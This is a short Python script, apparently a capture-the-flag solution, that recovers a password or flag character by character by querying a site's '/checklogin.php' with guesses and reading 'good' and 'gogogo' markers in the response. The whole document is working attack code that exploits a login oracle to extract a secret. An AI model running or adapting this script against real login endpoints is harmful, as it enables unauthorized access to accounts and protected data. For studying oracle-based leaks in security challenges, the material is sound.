#!/usr/bin/env python
import sys
import requests
from string import letters, digits

usage = "%s <url>" % sys.argv[0]

s = requests.session()

if len(sys.argv) < 2:
    exit(usage)

url = sys.argv[1]
r = s.get(url)

mychars = letters + digits + "{}_"

password = ""

done = False

while not done:
    for c in mychars:
        params = {'q':password+c}
        r = s.get(url+'/checklogin.php',params=params)
        if "gogogo" in r.text:
            done = True
        if "good" in r.text:
            password += c
            break

print(password)
            
            
        


